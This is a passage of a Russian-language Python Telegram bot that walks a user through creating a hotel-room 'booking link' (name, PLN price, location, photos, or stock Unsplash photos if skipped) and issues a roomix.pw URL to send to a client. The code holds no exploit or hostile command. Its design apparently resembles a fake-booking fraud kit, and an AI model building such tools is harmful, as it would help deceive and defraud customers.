        "https://images.unsplash.com/photo-1582719478250-c89cae4dc85b?auto=format&fit=crop&w=800&q=80"
    ]
    
    await state.update_data(photos=default_photos)
    await process_photos_complete(callback.message, state)
    await callback.answer()

# Функция завершения загрузки фото
async def process_photos_complete(message: types.Message, state: FSMContext):
    user_data = await state.get_data()
    photos = user_data.get('photos', [])
    
    await state.update_data(images=photos)
    await state.set_state(LinkStates.confirmation)
    
    # Показываем подтверждение
    confirmation_text = (
        "📋 <b>Проверьте данные ссылки:</b>\n\n"
        f"🏷️ <b>Название:</b> {user_data['link_name']}\n"
        f"💰 <b>Цена:</b> {user_data['price']} PLN/ночь\n"
        f"📍 <b>Локация:</b> {user_data['location']}\n"
        f"🖼️ <b>Фото:</b> {len(photos)} шт.\n\n"
        "Всё верно?"
    )
    
    await message.answer(
        confirmation_text,
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [
                InlineKeyboardButton(text="✅ Создать", callback_data="confirm_link"),
                InlineKeyboardButton(text="🔄 Заполнить заново", callback_data="restart_link")
            ],
            [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_photos")]
        ])
    )

# Кнопки "Назад" между шагами
@dp.callback_query(F.data == "back_to_name")
async def back_to_name(callback: types.CallbackQuery, state: FSMContext):
    await state.set_state(LinkStates.waiting_for_name)
    await callback.message.edit_text(
        "🔗 <b>Создание ссылки для бронирования</b>\n\n"
        "📝 <b>Шаг 1 из 5:</b> Введите название номера\n\n"
        "<i>Пример:</i> <code>Премиум Люкс с видом на город</code>",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_profile")]
        ])
    )
    await callback.answer()

@dp.callback_query(F.data == "back_to_price")
async def back_to_price(callback: types.CallbackQuery, state: FSMContext):
    await state.set_state(LinkStates.waiting_for_price)
    await callback.message.edit_text(
        "💰 <b>Шаг 2 из 5:</b> Введите цену за ночь (в PLN)\n\n"
        "<i>Пример:</i> <code>450</code>",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_name")]
        ])
    )
    await callback.answer()

@dp.callback_query(F.data == "back_to_location")
async def back_to_location(callback: types.CallbackQuery, state: FSMContext):
    await state.set_state(LinkStates.waiting_for_location)
    await callback.message.edit_text(
        "📍 <b>Шаг 3 из 5:</b> Введите страну и город\n\n"
        "<i>Пример:</i> <code>Польша, Варшава</code>",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_price")]
        ])
    )
    await callback.answer()

@dp.callback_query(F.data == "back_to_photos")
async def back_to_photos(callback: types.CallbackQuery, state: FSMContext):
    await state.set_state(LinkStates.waiting_for_photos)
    
    # СБРАСЫВАЕМ список фото при возврате
    user_data = await state.get_data()
    if 'photos' in user_data:
        await state.update_data(photos=[])
    
    await callback.message.edit_text(
        "🖼️ <b>Шаг 4 из 5:</b> Пришлите фотографии номера\n\n"
        "📎 Можно отправить несколько фото сразу\n"
        "📎 <b>Минимум:</b> 1 фото\n"
        "📎 <b>Максимум:</b> 5 фото\n\n"
        "<i>Просто пришлите фото как обычное сообщение 📸</i>\n\n"
        "<b>После загрузки всех фото нажмите «✅ Готово»</b>",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="✅ Готово", callback_data="photos_done")],
            [InlineKeyboardButton(text="➡️ Пропустить", callback_data="skip_photos")],
            [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_location")]
        ])
    )
    await callback.answer()

# Подтверждение и создание ссылки
@dp.callback_query(F.data == "confirm_link")
async def confirm_link_creation(callback: types.CallbackQuery, state: FSMContext):
    user_data = await state.get_data()
    
    # Генерируем уникальный код
    link_code = generate_link_code()
    
    # Сохраняем в БД
    success = save_booking_link(
        user_id=callback.from_user.id,
        link_name=user_data['link_name'],
        price=user_data['price'],
        location=user_data['location'],
        images=user_data['images'],
        link_code=link_code
    )
    
    if success:
        full_url = f"https://roomix.pw/#{link_code}"
        
        await callback.message.edit_text(
            "✅ <b>Ссылка успешно создана!</b>\n\n"
            f"🏷️ <b>Название:</b> {user_data['link_name']}\n"
            f"💰 <b>Цена:</b> {user_data['price']} PLN/ночь\n"
            f"📍 <b>Локация:</b> {user_data['location']}\n"
            f"🖼️ <b>Фото:</b> {len(user_data['images'])} шт.\n\n"
            f"🌐 <b>Ваша ссылка:</b>\n<code>{full_url}</code>\n\n"
            "Отправьте эту ссылку клиенту для бронирования.",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="📋 Мои ссылки", callback_data="my_links")],
                [InlineKeyboardButton(text="🔗 Создать еще", callback_data="create_link")],
                [InlineKeyboardButton(text="◀️ В профиль", callback_data="back_to_profile")]
            ])
        )
    else:
        await callback.message.edit_text(
            "❌ <b>Ошибка при создании ссылки</b>\n\n"
            "Попробуйте позже или обратитесь к администратору.",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🔄 Попробовать снова", callback_data="create_link")],
                [InlineKeyboardButton(text="◀️ В профиль", callback_data="back_to_profile")]
            ])
        )
    
    await state.clear()
    await callback.answer()

# Перезапуск создания ссылки
@dp.callback_query(F.data == "restart_link")
async def restart_link_creation(callback: types.CallbackQuery, state: FSMContext):
    await state.clear()
    await create_link_start(callback, state)

async def main():
    logger.info("🚀 Бот запускается...")
    logger.info("🌐 SSE сервер запущен с CORS для GitHub Pages")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())







